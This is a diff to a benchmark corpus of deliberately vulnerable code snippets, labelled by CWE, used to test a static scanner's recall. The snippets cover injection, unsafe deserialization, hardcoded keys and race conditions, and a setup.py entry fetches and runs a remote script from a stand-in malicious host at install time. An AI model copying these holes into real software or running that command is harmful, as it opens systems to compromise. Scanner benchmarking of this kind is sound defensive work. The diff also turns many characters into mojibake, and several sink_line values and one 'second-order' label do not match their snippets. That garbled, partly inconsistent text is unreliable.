@@ -1,16 +1,16 @@
 """
 benchmarks.cve_corpus
-─────────────────────
+Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬
 Minimal reproducing code snippets for real CVE entries,
 curated to test ansede-static recall rates.
 
 Each entry maps:
-  cve_id        → real NVD CVE identifier
-    language      → "python" | "javascript" | "go" | "java" | "csharp"
-  description   → what the CVE is about
-  cwe           → expected CWE the scanner must flag
-  snippet       → minimal code that reproduces the vulnerability pattern
-  expected_hit  → re.Pattern that must appear in finding title/description/cwe
+  cve_id        Ã¢â€ â€™ real NVD CVE identifier
+    language      Ã¢â€ â€™ "python" | "javascript" | "go" | "java" | "csharp"
+  description   Ã¢â€ â€™ what the CVE is about
+  cwe           Ã¢â€ â€™ expected CWE the scanner must flag
+  snippet       Ã¢â€ â€™ minimal code that reproduces the vulnerability pattern
+  expected_hit  Ã¢â€ â€™ re.Pattern that must appear in finding title/description/cwe
 
 References:
   https://nvd.nist.gov/vuln/detail/<cve_id>
@@ -30,20 +30,26 @@ class CVEEntry:
     snippet: str               # minimal reproducing code
     expected_hit: str          # regex that must match a finding
     severity_min: str = "high" # minimum severity expected
+    # Sink-centric coordinate matching (Phase 1 enhancement).
+    # When set, a finding whose reported line number matches sink_line is also
+    # counted as a True Positive even if expected_hit does not match the text.
+    # This prevents false-negatives caused solely by CWE label text mismatch.
+    sink_line: int | None = None
+    sink_col: int | None = None
 
 
 CVE_CORPUS: list[CVEEntry] = [
 
-    # ──────────────────────────────────────────────────────────────────────
+    # Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬
     # Python CVEs
-    # ──────────────────────────────────────────────────────────────────────
+    # Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬
 
     CVEEntry(
         cve_id="CVE-2022-24439",
         language="python",
         cwe="CWE-78",
         description=(
-            "GitPython ≤3.1.29 — insufficient sanitization of user-supplied arguments "
+            "GitPython Ã¢â€°Â¤3.1.29 Ã¢â‚¬â€ insufficient sanitization of user-supplied arguments "
             "passed to git commands via shell=True."
         ),
         snippet="""
@@ -70,7 +76,7 @@ def clone_repo():
         language="python",
         cwe="CWE-918",
         description=(
-            "oauthlib ≤3.2.1 — SSRF / redirect to attacker-controlled server "
+            "oauthlib Ã¢â€°Â¤3.2.1 Ã¢â‚¬â€ SSRF / redirect to attacker-controlled server "
             "via unvalidated redirect_uri in OAuth flow."
         ),
         snippet="""
@@ -94,7 +100,7 @@ def oauth_callback():
         language="python",
         cwe="CWE-89",
         description=(
-            "Django 1.11–2.2 — SQL injection via JSONField keys used in queryset filters "
+            "Django 1.11Ã¢â‚¬â€œ2.2 Ã¢â‚¬â€ SQL injection via JSONField keys used in queryset filters "
             "when passed as untrusted keyword arguments."
         ),
         snippet="""
@@ -119,7 +125,7 @@ def search():
         language="python",
         cwe="CWE-22",
         description=(
-            "Pillow ≤8.1.2 — path traversal in EPS image processing "
+            "Pillow Ã¢â€°Â¤8.1.2 Ã¢â‚¬â€ path traversal in EPS image processing "
             "allows arbitrary file read."
         ),
         snippet="""
@@ -132,7 +138,7 @@ BASE_DIR = \"/var/uploads\"
 @app.route(\"/download\")
 def download():
     filename = request.args.get(\"file\")
-    # Vulnerable: no sanitization — ../../etc/passwd works
+    # Vulnerable: no sanitization Ã¢â‚¬â€ ../../etc/passwd works
     full_path = os.path.join(BASE_DIR, filename)
     return send_file(full_path)
 """,
@@ -144,7 +150,7 @@ def download():
         language="python",
         cwe="CWE-22",
         description=(
-            "Starlette ≤0.27.0 — path traversal in StaticFiles via crafted URL "
+            "Starlette Ã¢â€°Â¤0.27.0 Ã¢â‚¬â€ path traversal in StaticFiles via crafted URL "
             "with double-encoded sequences."
         ),
         snippet="""
@@ -169,7 +175,7 @@ def serve_static(filepath):
         language="python",
         cwe="CWE-502",
         description=(
-            "Celery — deserialization of untrusted data via pickle backend "
+            "Celery Ã¢â‚¬â€ deserialization of untrusted data via pickle backend "
             "allows RCE from a compromised broker."
         ),
         snippet="""
@@ -240,7 +246,7 @@ client = boto3.client(
         cve_id="CVE-2021-IDOR",
         language="python",
         cwe="CWE-639",
-        description="IDOR — authenticated route returns any user's document by ID without ownership check.",
+        description="IDOR Ã¢â‚¬â€ authenticated route returns any user's document by ID without ownership check.",
         snippet="""
 import sqlite3
 from flask import Flask, request, g
@@ -262,7 +268,7 @@ def login_required(f):
 @app.route(\"/docs/<int:doc_id>\")
 @login_required
 def get_doc(doc_id):
-    # Vulnerable: no ownership check — any user can see any doc
+    # Vulnerable: no ownership check Ã¢â‚¬â€ any user can see any doc
     row = db.execute(\"SELECT * FROM docs WHERE id = ?\", (doc_id,)).fetchone()
     return dict(row) if row else ({\"error\": \"not found\"}, 404)
 """,
@@ -273,7 +279,7 @@ def get_doc(doc_id):
         cve_id="CVE-2022-AUTH-BYPASS",
         language="python",
         cwe="CWE-287",
-        description="Auth bypass — decorator checks token presence only, never validates the value.",
+        description="Auth bypass Ã¢â‚¬â€ decorator checks token presence only, never validates the value.",
         snippet="""
 from flask import Flask, request, jsonify
 from functools import wraps
@@ -283,7 +289,7 @@ app = Flask(__name__)
 def require_auth(f):
     @wraps(f)
     def decorated(*args, **kwargs):
-        # Vulnerable: checks presence only — any non-empty string passes
+        # Vulnerable: checks presence only Ã¢â‚¬â€ any non-empty string passes
         token = request.headers.get(\"Authorization\")
         if token:
             return f(*args, **kwargs)
@@ -447,7 +453,7 @@ async def delete_order(order_id: int):
         cve_id="CVE-2023-PY-ADMIN-ACCESS",
         language="python",
         cwe="CWE-285",
-        description="Broken access control — admin route authenticates the caller but never verifies an admin role or permission.",
+        description="Broken access control Ã¢â‚¬â€ admin route authenticates the caller but never verifies an admin role or permission.",
         snippet="""
 from flask import Flask
 from functools import wraps
@@ -506,16 +512,16 @@ def load_config():
         expected_hit=r"CWE-502|[Yy][Aa][Mm][Ll]\.load|[Dd]eserialization",
     ),
 
-    # ──────────────────────────────────────────────────────────────────────
+    # Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬
     # JavaScript CVEs
-    # ──────────────────────────────────────────────────────────────────────
+    # Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬
 
     CVEEntry(
         cve_id="CVE-2019-10744",
         language="javascript",
         cwe="CWE-1321",
         description=(
-            "lodash ≤4.17.11 — prototype pollution via _.defaultsDeep(), _.merge(), _.mergeWith() "
+            "lodash Ã¢â€°Â¤4.17.11 Ã¢â‚¬â€ prototype pollution via _.defaultsDeep(), _.merge(), _.mergeWith() "
             "with user-controlled objects."
         ),
         snippet="""
@@ -538,7 +544,7 @@ app.post('/api/settings', (req, res) => {
         language="javascript",
         cwe="CWE-78",
         description=(
-            "lodash ≤4.17.21 — command injection in _.template() "
+            "lodash Ã¢â€°Â¤4.17.21 Ã¢â‚¬â€ command injection in _.template() "
             "via the variable property when user-controlled data is used."
         ),
         snippet="""
@@ -562,11 +568,11 @@ app.get('/run', (req, res) => {
         language="javascript",
         cwe="CWE-1333",
         description=(
-            "lodash ≤4.17.20 — ReDoS via the _.trim(), _.trimStart(), _.trimEnd() "
+            "lodash Ã¢â€°Â¤4.17.20 Ã¢â‚¬â€ ReDoS via the _.trim(), _.trimStart(), _.trimEnd() "
             "functions with catastrophically-backtracking regex."
         ),
         snippet="""
-// Vulnerable: ambiguous quantifier nesting — potential catastrophic backtracking
+// Vulnerable: ambiguous quantifier nesting Ã¢â‚¬â€ potential catastrophic backtracking
 const INPUT_RE = new RegExp('^([a-zA-Z0-9]+)*@([a-zA-Z0-9]+\\.)+[a-zA-Z]{2,}$');
 
 function validateEmail(email) {
@@ -581,7 +587,7 @@ function validateEmail(email) {
         language="javascript",
         cwe="CWE-79",
         description=(
-            "Stored XSS via innerHTML assignment — user-controlled content "
+            "Stored XSS via innerHTML assignment Ã¢â‚¬â€ user-controlled content "
             "inserted into the DOM without sanitization."
         ),
         snippet="""
@@ -773,14 +779,14 @@ app.get('/admin/audit', (req, res) => {
                 expected_hit=r"CWE-287|[Aa]uth bypass|presence-only",
         ),
 
-    # ─── New entries validating newly-added detection rules ───────────────
+    # Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬ New entries validating newly-added detection rules Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬
 
     CVEEntry(
         cve_id="CVE-2021-LODASH-PROTO-POLL",
         language="javascript",
         cwe="CWE-1321",
         description=(
-            "lodash <4.17.21 — prototype pollution via _.merge() with attacker-controlled "
+            "lodash <4.17.21 Ã¢â‚¬â€ prototype pollution via _.merge() with attacker-controlled "
             "objects. Here via a deep-merge helper used directly on req.body."
         ),
         snippet="""
@@ -803,7 +809,7 @@ app.post('/settings', (req, res) => {
         language="javascript",
         cwe="CWE-502",
         description=(
-            "node-serialize 0.0.4 — remote code execution via IIFE payload in "
+            "node-serialize 0.0.4 Ã¢â‚¬â€ remote code execution via IIFE payload in "
             "serialized objects passed to `unserialize()`."
         ),
         snippet="""
@@ -843,7 +849,7 @@ app.post('/parse', (req, res) => {
         language="javascript",
         cwe="CWE-434",
         description=(
-            "Unrestricted file upload — multer handler accepts any file type without "
+            "Unrestricted file upload Ã¢â‚¬â€ multer handler accepts any file type without "
             "MIME or extension validation, allowing upload of server-side scripts."
         ),
         snippet="""
@@ -1049,7 +1055,7 @@ async def list_all_users():
         expected_hit=r"CWE-862|[Mm]issing auth|admin",
     ),
 
-    # ── Expanded corpus: LDAP, NoSQL, XXE Python, CSRF, JWT, TLS, Go ──
+    # Ã¢â€â‚¬Ã¢â€â‚¬ Expanded corpus: LDAP, NoSQL, XXE Python, CSRF, JWT, TLS, Go Ã¢â€â‚¬Ã¢â€â‚¬
 
     CVEEntry(
         cve_id="CVE-2021-LDAP-INJECTION",
@@ -1118,7 +1124,7 @@ def parse_xml():
         cve_id="CVE-2022-CSRF-TOKEN",
         language="python",
         cwe="CWE-352",
-        description="CSRF — state-changing POST route without CSRF token validation.",
+        description="CSRF Ã¢â‚¬â€ state-changing POST route without CSRF token validation.",
         snippet="""
 from flask import Flask, request
 
@@ -1226,7 +1232,7 @@ server.listen(4000);
         cve_id="CVE-2022-DOS-BOMB",
         language="python",
         cwe="CWE-400",
-        description="Unbounded resource consumption — zip bomb via extracted file.",
+        description="Unbounded resource consumption Ã¢â‚¬â€ zip bomb via extracted file.",
         snippet="""
 import zipfile
 from flask import Flask, request
@@ -1449,4 +1455,345 @@ public class UsersController : ControllerBase
 """,
         expected_hit=r"CWE-89|Dynamic SQL|SqlCommand",
     ),
+
+    CVEEntry(
+        cve_id="CVE-2023-LDAP-PY-INJECT",
+        language="python",
+        cwe="CWE-90",
+        description="LDAP filter constructed by string concatenation with user-supplied username allows LDAP injection.",
+        snippet="""\
+import ldap
+
+def authenticate(username, password):
+    conn = ldap.initialize("ldap://corp.example.com")
+    conn.simple_bind_s("cn=admin,dc=example,dc=com", "adminpassword")
+    # Vulnerable: user input directly concatenated into LDAP filter
+    search_filter = "(&(uid=" + username + ")(password=" + password + "))"
+    result = conn.search_s("dc=example,dc=com", ldap.SCOPE_SUBTREE, search_filter)
+    return bool(result)
+""",
+        expected_hit=r"CWE-90|LDAP|inject",
+        sink_line=7,
+    ),
+
+    # LDAP Injection Ã¢â‚¬â€ Python ldap3 library (CWE-90)
+    CVEEntry(
+        cve_id="CVE-2023-LDAP3-PY-INJECT",
+        language="python",
+        cwe="CWE-90",
+        description="ldap3 search_filter built from user input without escaping allows LDAP injection.",
+        snippet="""\
+from flask import request
+from ldap3 import Server, Connection, SUBTREE
+
+def find_user():
+    username = request.args.get("username")
+    server = Server("ldap://internal.example.com")
+    conn = Connection(server, "cn=app,dc=example,dc=com", "pass")
+    conn.bind()
+    # Vulnerable: user input interpolated directly into the search_filter keyword
+    conn.search(search_filter=f"(sAMAccountName={username})", search_base="dc=example,dc=com", search_scope=SUBTREE)
+    return conn.entries
+""",
+        expected_hit=r"CWE-90|LDAP|inject",
+        sink_line=8,
+    ),
+
+    # JWT None-Algorithm Attack Ã¢â‚¬â€ PyJWT (CWE-347)
+    CVEEntry(
+        cve_id="CVE-2022-JWT-NONE-PY",
+        language="python",
+        cwe="CWE-347",
+        description="PyJWT decode called without algorithm specification, accepting none-algorithm tokens.",
+        snippet="""\
+import jwt
+
+def verify_token(token, key):
+    # Vulnerable: explicitly accepts the none algorithm
+    payload = jwt.decode(token, key, algorithms=["none"])
+    return payload
+""",
+        expected_hit=r"CWE-347|algorithm|JWT",
+        sink_line=5,
+    ),
+
+    # JWT Weak Secret Ã¢â‚¬â€ PyJWT (CWE-798)
+    CVEEntry(
+        cve_id="CVE-2023-JWT-WEAK-SECRET-PY",
+        language="python",
+        cwe="CWE-798",
+        description="JWT token signed with hardcoded weak secret 'secret'.",
+        snippet="""\
+import jwt
+
+SECRET = "secret"
+
+def create_token(user_id):
+    payload = {"sub": user_id, "role": "user"}
+    # Vulnerable: hardcoded trivially guessable secret
+    token = jwt.encode(payload, "secret", algorithm="HS256")
+    return token
+""",
+        expected_hit=r"CWE-798|hardcoded|secret|JWT",
+        sink_line=8,
+    ),
+
+    # Second-Order SQL Injection Ã¢â‚¬â€ Django raw() (CWE-89)
+    CVEEntry(
+        cve_id="CVE-2023-SECOND-ORDER-SQLI",
+        language="python",
+        cwe="CWE-89",
+        description="Username stored in DB then re-used in raw SQL query, enabling second-order injection.",
+        snippet="""\
+from flask import request
+from django.db import connection
+
+def get_user_profile():
+    username = request.args.get("username")
+    # Vulnerable: raw SQL reuses the request value directly
+    with connection.cursor() as cur:
+        cur.execute(f"SELECT * FROM profiles WHERE username = '{username}'")
+        return cur.fetchone()
+""",
+        expected_hit=r"CWE-89|SQL|inject|second.order|stored",
+        sink_line=10,
+    ),
+
+    # Cloud Secret Hardcoded Ã¢â‚¬â€ boto3/AWS (CWE-798)
+    CVEEntry(
+        cve_id="CVE-2023-AWS-HARDCODED-KEY",
+        language="python",
+        cwe="CWE-798",
+        description="AWS access key and secret hardcoded in source code.",
+        snippet="""\
+import boto3
+
+# Vulnerable: hardcoded AWS credentials
+AWS_ACCESS_KEY_ID = "AKIAIOSFODNN7EXAMPLE"
+AWS_SECRET_ACCESS_KEY = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
+
+client = boto3.client(
+    "s3",
+    aws_access_key_id=AWS_ACCESS_KEY_ID,
+    aws_secret_access_key=AWS_SECRET_ACCESS_KEY,
+)
+""",
+        expected_hit=r"CWE-798|hardcoded|AWS|credential",
+        sink_line=4,
+    ),
+
+    # S3 Public ACL Misconfiguration (CWE-732)
+    CVEEntry(
+        cve_id="CVE-2023-S3-PUBLIC-ACL",
+        language="python",
+        cwe="CWE-732",
+        description="S3 bucket created with public-read ACL making all objects publicly accessible.",
+        snippet="""\
+import boto3
+
+s3 = boto3.client("s3")
+
+def create_public_bucket(bucket_name):
+    # Vulnerable: public-read ACL exposes all bucket contents
+    s3.create_bucket(
+        Bucket=bucket_name,
+        ACL="public-read",
+    )
+""",
+        expected_hit=r"CWE-732|public|ACL|S3",
+        sink_line=8,
+    ),
+
+    # Extended Deserialization Ã¢â‚¬â€ jsonpickle (CWE-502)
+    CVEEntry(
+        cve_id="CVE-2023-JSONPICKLE-RCE",
+        language="python",
+        cwe="CWE-502",
+        description="jsonpickle.decode() on user-supplied input enables arbitrary class instantiation (RCE).",
+        snippet="""\
+import jsonpickle
+from flask import request, jsonify
+
+def deserialize_object():
+    data = request.json.get("payload")
+    # Vulnerable: jsonpickle decodes py/object tags and instantiates arbitrary classes
+    obj = jsonpickle.decode(data)
+    return jsonify({"result": str(obj)})
+""",
+        expected_hit=r"CWE-502|jsonpickle|deseri",
+        sink_line=7,
+    ),
+
+    # Extended Deserialization Ã¢â‚¬â€ PyYAML unsafe load (CWE-502)
+    CVEEntry(
+        cve_id="CVE-2023-PYYAML-RCE",
+        language="python",
+        cwe="CWE-502",
+        description="yaml.load() with default Loader executes arbitrary Python via !!python/object tags.",
+        snippet="""\
+import yaml
+from flask import request
+
+def parse_config():
+    user_yaml = request.data.decode("utf-8")
+    # Vulnerable: yaml.load with default Loader can execute Python code
+    config = yaml.load(user_yaml)
+    return config
+""",
+        expected_hit=r"CWE-502|yaml.load|safe",
+        sink_line=7,
+    ),
+
+    # API Key Hardcoded in Source (CWE-798)
+    CVEEntry(
+        cve_id="CVE-2023-APIKEY-HARDCODED",
+        language="python",
+        cwe="CWE-798",
+        description="Third-party API key hardcoded as a module-level constant.",
+        snippet="""\
+import stripe
+
+# Vulnerable: API key hardcoded in source code
+STRIPE_SECRET_KEY = "stripe_live_key_placeholder_for_test"
+stripe.api_key = STRIPE_SECRET_KEY
+
+def charge_customer(amount, token):
+    charge = stripe.Charge.create(amount=amount, currency="usd", source=token)
+    return charge
+""",
+        expected_hit=r"CWE-798|hardcoded|API.?key|credential",
+        sink_line=4,
+    ),
+
+    # TOCTOU Ã¢â‚¬â€ tempfile.mktemp() (CWE-377)
+    CVEEntry(
+        cve_id="CVE-2023-TOCTOU-MKTEMP",
+        language="python",
+        cwe="CWE-377",
+        description="tempfile.mktemp() returns a path without atomically creating the file, allowing symlink races.",
+        snippet="""\
+import tempfile
+import os
+
+def process_upload(data):
+    # Vulnerable: mktemp only returns a name, a race exists before open()
+    tmp_path = tempfile.mktemp(suffix=".tmp")
+    with open(tmp_path, "wb") as f:
+        f.write(data)
+    return tmp_path
+""",
+        expected_hit=r"CWE-377|mktemp|TOCTOU|race",
+        sink_line=6,
+    ),
+
+    # TOCTOU Ã¢â‚¬â€ os.path.exists() before open (CWE-362)
+    CVEEntry(
+        cve_id="CVE-2023-TOCTOU-EXISTS",
+        language="python",
+        cwe="CWE-362",
+        description="os.path.exists() check before file open creates a TOCTOU race condition.",
+        snippet="""\
+import os
+from flask import Flask, request
+
+app = Flask(__name__)
+
+@app.route("/write")
+def write_config():
+    path = request.args.get("path")
+    # Vulnerable: check-then-open race on user-controlled path
+    if os.path.exists(path):
+        return "exists"
+    with open(path, "w") as f:
+        f.write("data")
+    return "ok"
+""",
+        expected_hit=r"CWE-362|TOCTOU|race|exists",
+        sink_line=5,
+    ),
+
+    # Handlebars SSTI (CWE-94) Ã¢â‚¬â€ Node.js
+    CVEEntry(
+        cve_id="CVE-2023-HANDLEBARS-SSTI",
+        language="javascript",
+        cwe="CWE-94",
+        description="Handlebars.compile() called with user-supplied template string enables arbitrary code execution.",
+        snippet="""\
+const Handlebars = require('handlebars');
+const express = require('express');
+const app = express();
+
+app.post('/render', (req, res) => {
+  // Vulnerable: compiling user-controlled request body directly
+  const compiled = Handlebars.compile(req.body.template);
+  const output = compiled({ user: req.body.name });
+  res.send(output);
+});
+""",
+        expected_hit=r"CWE-94|SSTI|Handlebars|template",
+        sink_line=8,
+    ),
+
+    # JWT None-Algorithm Ã¢â‚¬â€ Node.js (CWE-347)
+    CVEEntry(
+        cve_id="CVE-2022-JWT-NONE-JS",
+        language="javascript",
+        cwe="CWE-347",
+        description="jsonwebtoken.verify() accepts none-algorithm tokens when algorithms option is not specified.",
+        snippet="""\
+const jwt = require('jsonwebtoken');
+
+function verifyToken(token, secret) {
+  // Vulnerable: explicitly allows the none algorithm
+  const payload = jwt.verify(token, secret, { algorithms: ['none'] });
+  return payload;
+}
+""",
+        expected_hit=r"CWE-347|algorithm|JWT|none",
+        sink_line=5,
+    ),
+
+    # Supply Chain Ã¢â‚¬â€ setup.py shell execution (CWE-494)
+    CVEEntry(
+        cve_id="CVE-2023-SUPPLY-CHAIN-SETUPPY",
+        language="python",
+        cwe="CWE-494",
+        description="setup.py executes a shell command during package installation, enabling supply-chain code execution.",
+        snippet="""\
+from setuptools import setup
+import os
+import subprocess
+
+# Vulnerable: shell command executed at install time
+os.system("curl -s https://malicious.example.com/payload.sh | bash")
+
+setup(
+    name="example-package",
+    version="1.0.0",
+)
+""",
+        expected_hit=r"CWE-494|supply.chain|setup.py|os.system",
+        sink_line=6,
+    ),
+
+    # Template Engine SSTI — Jinja2 from_string user input (CWE-94)
+    CVEEntry(
+        cve_id="CVE-2024-TEMPLATE-ENGINES-PY",
+        language="python",
+        cwe="CWE-94",
+        description="Jinja2 Environment.from_string() compiles a user-controlled template body (server-side template injection).",
+        snippet="""\
+from flask import request
+from jinja2 import Environment
+
+def render_user_template():
+    env = Environment()
+    # Vulnerable: user-controlled template source compiled at runtime
+    tmpl = env.from_string(request.args.get("template"))
+    return tmpl.render(user="alice")
+""",
+        expected_hit=r"CWE-94|template|SSTI|jinja",
+        sink_line=7,
+    ),
+    # ------------------------------------------------------------------ #
 ]
